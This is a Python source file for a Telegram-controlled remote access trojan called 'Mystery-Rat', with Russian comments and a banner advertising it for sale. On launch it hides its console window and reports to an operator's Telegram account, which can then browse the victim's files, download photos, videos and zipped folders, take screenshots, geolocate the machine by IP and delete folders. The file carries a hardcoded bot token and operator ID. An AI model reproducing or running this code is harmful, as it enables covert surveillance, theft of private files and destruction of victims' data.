import os
import shutil
import random
import time
import platform
import tempfile
import hashlib
import webbrowser
import requests
import logging

from telebot import TeleBot, types
from colorama import Fore, Style, init
import pyautogui

# Очистка консоли
os.system('cls' if os.name == 'nt' else 'clear')
init()

# === СКРЫТИЕ КОНСОЛИ НА WINDOWS === #
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # SW_HIDE = 0

# Скрыть окно сразу после запуска
hide_console()

# ================ [Настройка бота] ================ #
TOKEN = '8583310369:AAHPShfvNwbzxEfpcNwXXLwMrOF2tr6RD8I'  # Ваш токен
ADMIN_ID = 8382514971  # Ваш Telegram ID
bot = TeleBot(TOKEN)
# ================================================= #

# Настройка логирования
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'mystery_rat.log')
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    encoding='utf-8'
)

# Проверка и установка библиотек
requiBLUE_libraries = ['telebot', 'colorama', 'pyautogui']
def install_libraries():
    for lib in requiBLUE_libraries:
        try:
            __import__(lib)
        except ImportError:
            os.system(f'pip install {lib}')
install_libraries()

# ================ [Вспомогательные функции] ================ #

ITEMS_PER_PAGE = 10
navigation_history = {}

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def find_path_by_hash(path_hash):
    root_directory = os.path.expanduser("~")
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.mp4', '.avi', '.mkv', '.mov')):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if media_type == 'photo' and file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                pass
            elif media_type == 'video' and file.lower().endswith(('.mp4', '.avi', '.mkv', '.mov')):
                pass
            else:
                continue
            if sent_count >= count:
                return
            try:
                with open(os.path.join(root, file), 'rb') as media_file:
                    if media_type == 'photo':
                        bot.send_photo(message.chat.id, media_file)
                    else:
                        bot.send_video(message.chat.id, media_file)
                sent_count += 1
            except Exception as e:
                bot.send_message(message.chat.id, f'Ошибка при отправке {media_type}: {e}')

def find_folder(root_directory, folder_name):
    for root, dirs, _ in os.walk(root_directory):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

def is_folder_too_large(folder_path, max_size_mb=100):
    total_size = 0
    for dirpath, _, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.exists(fp):
                total_size += os.path.getsize(fp)
    return total_size > max_size_mb * 1024 * 1024

def create_zip_archive(folder_path, folder_name):
    try:
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        base_name = zip_path.replace('.zip', '')
        shutil.make_archive(base_name, 'zip', folder_path)
        return zip_path
    except Exception as e:
        print(f"Ошибка архивации: {e}")
        return None

def ask_to_return_to_menu(message, task):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('Да', callback_data='return_to_menu')
    button2 = types.InlineKeyboardButton('Нет', callback_data=f'repeat_{task}')
    keyboard.add(button1, button2)
    bot.send_message(message.chat.id, 'Хотите вернуться в меню? 🔄', reply_markup=keyboard)

# ================ [Обработчики команд] ================ #

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "Привет! Это Mystery-Rat. Ниже представлены кнопки для управления устройством."
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton('Извлечь фотографии 📸', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('Очистка данных 🗑️', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('Копия данных 📂', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('Удалить папку 📁', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('Извлечь видео 🎥', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('Место нахождение 🌍', callback_data='location')
    button7 = types.InlineKeyboardButton('Файлы 📁', callback_data='files')
    button8 = types.InlineKeyboardButton('Сделать скриншот 📸', callback_data='screenshot')
    button9 = types.InlineKeyboardButton('Рабочий стол (архив) 💾', callback_data='desktop_archive')

    keyboard.add(button1, button5)
    keyboard.add(button2, button3)
    keyboard.add(button4, button9)
    keyboard.add(button6)
    keyboard.add(button7)
    keyboard.add(button8)

    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

# ================ [Файловый менеджер] ================ #

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    root_directory = os.path.expanduser("~")
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(directory)
    except PermissionError:
        bot.send_message(chat_id, f"Нет доступа к папке: {directory} 🔒")
        return
    files = []
    dirs = []
    for item in items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            files.append(item)
        else:
            dirs.append(item)
    all_items = dirs + files
    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = all_items[start:end]
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            ext = item.lower()
            if ext.endswith(('.png', '.jpg', '.jpeg', '.gif')):
                btn = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
            elif ext.endswith(('.mp4', '.avi', '.mkv', '.mov')):
                btn = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
            else:
                btn = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
        else:
            btn = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(btn)

    if len(history) > 1:
        keyboard.add(types.InlineKeyboardButton('⬅️ Назад', callback_data=f'back_{hash_path(directory)}'))
    if end < len(all_items):
        keyboard.add(types.InlineKeyboardButton('➡️ Следующая', callback_data=f'page_{hash_path(directory)}_{page+1}'))
    if page > 0:
        keyboard.add(types.InlineKeyboardButton('⬅️ Предыдущая', callback_data=f'page_{hash_path(directory)}_{page-1}'))

    try:
        if hasattr(message, 'message_id') and message.message_id:
            bot.edit_message_text(chat_id=chat_id, message_id=message.message_id,
                                  text=f"📁 {directory}", reply_markup=keyboard)
        else:
            bot.send_message(chat_id, f"📁 {directory}", reply_markup=keyboard)
    except Exception as e:
        bot.send_message(chat_id, f"📁 {directory}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Путь не найден. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None:
        bot.answer_callback_query(call.id, 'Файл не найден. 🚫')
        return
    try:
        with open(file_path, 'rb') as f:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, f)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv', '.mov')):
                bot.send_video(call.message.chat.id, f)
            else:
                bot.send_document(call.message.chat.id, f)
    except Exception as e:
        bot.answer_callback_query(call.id, f'Ошибка: {e} 🚫')

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    parts = call.data.split('_', 2)
    if len(parts) < 3:
        return
    directory_hash, page = parts[1], int(parts[2])
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Путь не найден. 🚫')
        return
    show_directory_contents(call.message, directory, page)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Путь не найден. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        show_directory_contents(call.message, history[-1], 0)

# ================ [Новые функции] ================ #

@bot.callback_query_handler(func=lambda call: call.data == 'screenshot')
def take_screenshot(call):
    try:
        # Проверка активности сессии Windows
        if os.name == 'nt':
            import ctypes
            user32 = ctypes.windll.user32
            if not user32.GetForegroundWindow():
                bot.send_message(call.message.chat.id, "🖥️ Скриншот невозможен: сессия заблокирована или экран выключен.")
                return

        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            path = tmp.name
        pyautogui.screenshot(path)
        with open(path, 'rb') as f:
            bot.send_photo(call.message.chat.id, f, caption="📸 Скриншот экрана")
        os.remove(path)
        logging.info("Скриншот успешно отправлен")
    except Exception as e:
        error_str = str(e).lower()
        if "screen" in error_str or "display" in error_str or "cannot" in error_str:
            msg = "🖥️ Не удалось сделать скриншот (экран недоступен)."
        else:
            msg = f"❌ Ошибка скриншота: {e}"
        bot.send_message(call.message.chat.id, msg)
        logging.error(f"Ошибка скриншота: {e}")
    ask_to_return_to_menu(call.message, 'screenshot')

@bot.callback_query_handler(func=lambda call: call.data == 'desktop_archive')
def archive_desktop(call):
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.exists(desktop):
            bot.send_message(call.message.chat.id, "Рабочий стол не найден. 🚫")
            return
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        base = zip_path.replace('.zip', '')
        shutil.make_archive(base, 'zip', desktop)
        with open(zip_path, 'rb') as f:
            bot.send_document(call.message.chat.id, f, caption="📁 Архив рабочего стола")
        os.remove(zip_path)
        logging.info("Архив рабочего стола отправлен")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"Ошибка архива: {e} 🚫")
        logging.error(f"Ошибка архивации: {e}")
    ask_to_return_to_menu(call.message, 'desktop_archive')

# ================ [Остальные функции] ================ #

@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    try:
        ip_info = requests.get('http://ip-api.com/json/', timeout=10).json()
        if ip_info.get('status') == 'success':
            lat, lon = ip_info['lat'], ip_info['lon']
            info = (
                f"🌍 Местоположение:\n"
                f"Страна: {ip_info['country']}\n"
                f"Регион: {ip_info['regionName']}\n"
                f"Город: {ip_info['city']}\n"
                f"Провайдер: {ip_info['isp']}\n"
                f"IP: {ip_info['query']}"
            )
            bot.send_location(call.message.chat.id, lat, lon)
            bot.send_message(call.message.chat.id, info)
        else:
            bot.send_message(call.message.chat.id, "Не удалось определить местоположение. 🌐")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"Ошибка геолокации: {e} 🚫")

@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    root = os.path.expanduser("~")
    folders = [os.path.join(root, "Pictures"), os.path.join(root, "Desktop"), os.path.join(root, "Downloads")]
    photo_count = sum(count_photos(f) for f in folders if os.path.exists(f))
    photo_count += count_photos(root)
    bot.send_message(call.message.chat.id, f'Найдено {photo_count} фото. Сколько отправить? 📸')
    bot.register_next_step_handler(call.message, process_photo_count, root, folders)

def process_photo_count(message, root, folders):
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except:
        bot.send_message(message.chat.id, 'Введите корректное число. 📸')
        return
    for folder in folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'photo')
            count -= count_photos(folder)
            if count <= 0: return
    send_media_from_directory(root, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    root = os.path.expanduser("~")
    folders = [os.path.join(root, "Videos"), os.path.join(root, "Desktop"), os.path.join(root, "Downloads")]
    video_count = sum(count_videos(f) for f in folders if os.path.exists(f))
    video_count += count_videos(root)
    bot.send_message(call.message.chat.id, f'Найдено {video_count} видео. Сколько отправить? 🎥')
    bot.register_next_step_handler(call.message, process_video_count, root, folders)

def process_video_count(message, root, folders):
    try:
        count = int(message.text)
        if count <= 0: raise ValueError
    except:
        bot.send_message(message.chat.id, 'Введите корректное число. 🎥')
        return
    for folder in folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'video')
            count -= count_videos(folder)
            if count <= 0: return
    send_media_from_directory(root, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    bot.send_message(call.message.chat.id, 'Очистка невозможна в целях безопасности. 🛡️')
    ask_to_return_to_menu(call.message, 'clear_data')

@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, 'Введите название папки для копирования: 📂')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    name = message.text.strip()
    root = os.path.expanduser("~")
    path = find_folder(root, name)
    if not path:
        bot.send_message(message.chat.id, f'Папка "{name}" не найдена. 🚫')
        ask_to_return_to_menu(message, 'copy_data')
        return
    if is_folder_too_large(path):
        bot.send_message(message.chat.id, 'Папка большая. Архивируется... ⏳')
    zip_path = create_zip_archive(path, name)
    if zip_path:
        try:
            with open(zip_path, 'rb') as f:
                bot.send_document(message.chat.id, f)
            os.remove(zip_path)
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка отправки: {e} 🚫')
    else:
        bot.send_message(message.chat.id, 'Ошибка создания архива. 🚫')
    ask_to_return_to_menu(message, 'copy_data')

@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    bot.send_message(call.message.chat.id, 'Введите название папки для удаления: 📁')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    name = message.text.strip()
    root = os.path.expanduser("~")
    path = find_folder(root, name)
    if not path:
        bot.send_message(message.chat.id, f'Папка "{name}" не найдена. 🚫')
        ask_to_return_to_menu(message, 'delete_folder')
        return
    try:
        shutil.rmtree(path)
        bot.send_message(message.chat.id, f'Папка удалена: {name} 🗑️')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка удаления: {e} 🚫')
    ask_to_return_to_menu(message, 'delete_folder')

@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
def return_to_menu(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
def repeat_task(call):
    task = call.data.split('_', 1)[1]
    if task == 'extract_photos':
        ask_for_photo_count(call)
    elif task == 'search_videos':
        ask_for_video_count(call)
    elif task == 'copy_data':
        ask_for_folder_name(call)
    elif task == 'delete_folder':
        ask_for_delete_folder_name(call)
    elif task == 'screenshot':
        take_screenshot(call)
    elif task == 'desktop_archive':
        archive_desktop(call)
    else:
        bot.send_message(call.message.chat.id, 'Готов ждать новых команд. Нажмите "Меню".', 
                         reply_markup=types.InlineKeyboardMarkup().add(
                             types.InlineKeyboardButton('Меню', callback_data='return_to_menu')))

# ================ [Запуск] ================ #

def banner():
    mm = rf"""
 ███▄ ▄███▓▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ██▀███ ▓██   ██▓
▓██▒▀█▀ ██▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▪ ▓██ ▒ ██▒▒██  ██▒
▓██    ▓██░  ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒ ▒██ ██░
▒██    ▒██   ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄   ░ ▐██▓░
▒██▒   ░██▒  ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒ ░ ██▒▓░
░ ▒░   ░  ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░  ██▒▒▒ 
░  ░      ░ ▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░▓██ ░▒░ 
░      ░    ▒ ▒ ░░  ░  ░  ░    ░         ░     ░░   ░ ▒ ▒ ░░  
       ░    ░ ░           ░              ░  ░   ░     ░ ░     
            ░ ░                                       ░ ░     """
    mt = rf"""
    #Лучший фри сносер
    #Удачного пользования
╔════════════════════════════════════════════════════════════════════════╗
║                     Создатель: @mucteru    Price 9$                    ║
╠════════════════════════════════════════════════════════════════════════╣
║ [01] Мошенничество   [06] Канал     [11] Угрозы          [16] Тролинг  ║
║ [02] Спам            [07] Обичный   [12] Наркотики       [17] Вирт     ║
║ [03] Фишинг          [08] Сессия    [13] Религия         [18] Премиум  ║
║ [04] Спамер          [09] Группа    [14] Домогательство  [19] Бот      ║
║ [05] Дианон          [10] Насилие   [15] Контент 18+     [20] Выход    ║
╚════════════════════════════════════════════════════════════════════════╝"""
    print(mm)
    print(mt)

def notify_admin():
    try:
        bot.send_message(ADMIN_ID, "✅ Бот запущен! Используйте /start 🚀")
        logging.info("Уведомление админу отправлено")
    except Exception as e:
        logging.error(f"Не удалось уведомить админа: {e}")

if __name__ == '__main__':
    banner()
    notify_admin()
    print(f"\n📝 Логи сохраняются в: {log_file}")
    print("🔁 Бот работает в фоне. Окно скрыто. Для завершения — завершите процесс в диспетчере задач.\n")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.critical(f"КРИТИЧЕСКАЯ ОШИБКА: {e}")
            time.sleep(5)